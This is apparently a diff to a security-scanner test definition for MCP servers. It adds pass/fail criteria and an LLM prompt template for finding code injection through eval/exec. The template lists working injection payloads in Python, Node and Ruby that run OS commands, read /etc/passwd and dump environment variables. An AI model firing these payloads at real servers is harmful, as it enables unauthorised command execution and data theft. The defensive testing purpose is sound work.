@@ -17,12 +17,16 @@ pass_criteria: |-
   - No command output (file contents, user listings, system info) appears in tool responses
   - Server returns a validation error for inputs containing shell metacharacters
   - Flag-based bypasses (--rcfile, -c, --eval) are blocked or stripped
+  - Language-level injection payloads (eval/exec) are rejected with errors like "unsafe expression", "only numeric/math allowed", or equivalent sandboxing
+  - eval() is restricted to a safe subset (e.g. ast.literal_eval, sandboxed environment with no builtins)
 fail_criteria: |-
   - Response contains output consistent with command execution (file contents, whoami output, etc.)
   - Response contains /etc/passwd, /etc/hosts, or other system file contents
   - Response contains the output of injected shell commands (ip addr, uname, env, etc.)
   - Server accepts and processes arguments containing shell metacharacters without error
   - Error messages reveal that a shell was invoked with the attacker's payload
+  - Response contains output from language-level code execution (Python repr output, file contents from open().read(), environment variables from process.env)
+  - eval() or exec() successfully processes arbitrary code beyond the tool's stated purpose (e.g. a "math evaluator" returning file contents or OS info)
 judge_needs_llm: true
 applies_to_all_tools: true
 patterns:
@@ -83,4 +87,75 @@ patterns:
       ]
 
       Generate one entry per tool. Pick the most injection-prone parameter for each.
+  - name: Code Injection via eval/exec
+    template: |-
+      You are a security researcher testing an MCP server for code injection via language-level eval/exec surfaces (MCP05).
+
+      ATTACK BACKGROUND:
+      Many MCP servers implement tools that evaluate expressions, formulas, or code snippets using
+      language-level eval() or exec() functions. Unlike shell injection where you inject command
+      separators (;, |, $(...)), code injection targets the host language's evaluation context
+      directly. A "math evaluator" using Python eval() can be exploited with Python expressions;
+      a "formula engine" using JavaScript eval() can be exploited with JS code.
+
+      SIGNAL WORDS in tool descriptions that indicate eval/exec surfaces:
+      "evaluate", "expression", "calculate", "formula", "compute", "execute code", "run code",
+      "math", "calculator", "interpreter", "sandbox", "REPL"
+
+      ATTACK TECHNIQUES BY LANGUAGE:
+
+      Python (eval/exec):
+      1. OS command bridging: "__import__('os').popen('id').read()"
+      2. Subprocess: "__import__('subprocess').getoutput('whoami')"
+      3. File read: "open('/etc/passwd').read()"
+      4. Environment: "__import__('os').environ.get('HOME')"
+      5. Builtins escape: "().__class__.__bases__[0].__subclasses__()"
+
+      JavaScript/Node (eval/Function/vm):
+      1. Child process: "require('child_process').execSync('id').toString()"
+      2. File read: "require('fs').readFileSync('/etc/passwd','utf8')"
+      3. Environment: "JSON.stringify(process.env)"
+      4. Process info: "process.pid + ' ' + process.cwd()"
+
+      Ruby (eval/send/system):
+      1. Backtick exec: "`id`"
+      2. System call: "system('whoami')"
+      3. File read: "IO.read('/etc/passwd')"
+
+      AVAILABLE TOOLS (from tools/list):
+      {{tool_list_json}}
+
+      YOUR TASK:
+      Look at each tool's parameter schema and description. For every tool that accepts parameters
+      named: expression, code, formula, script, query, input, eval, calculation — OR whose
+      description mentions evaluating, calculating, computing, or executing code — generate a
+      language-level code injection payload.
+
+      Choose the appropriate language based on clues:
+      - Python MCP servers (most common): use Python eval payloads
+      - If tool mentions JavaScript/Node: use JS payloads
+      - If unclear: try Python first (most MCP servers are Python-based)
+
+      Prefer language-level payloads over shell metacharacters for these tools.
+      Try both data exfiltration (open('/etc/passwd').read()) and OS command bridging
+      (__import__('os').popen('id').read()).
+
+      OUTPUT FORMAT — respond with a JSON array only, no other text:
+      [
+        {
+          "tool_name": "<exact tool name>",
+          "jsonrpc_payload": {
+            "jsonrpc": "2.0",
+            "method": "tools/call",
+            "params": {
+              "name": "<exact tool name>",
+              "arguments": { "<expression/code param>": "<code injection payload>" }
+            },
+            "id": 1
+          },
+          "judge_hint": "<Describe what code execution output would look like. E.g. 'If eval() processes the payload, response will contain /etc/passwd file lines (root:x:0:0:...) or uid/gid output. A math error or restricted-operation error means the server is safe.'>"
+        }
+      ]
+
+      Generate one entry per tool with an eval-like surface. Skip tools that clearly only do I/O without code evaluation.
 ---
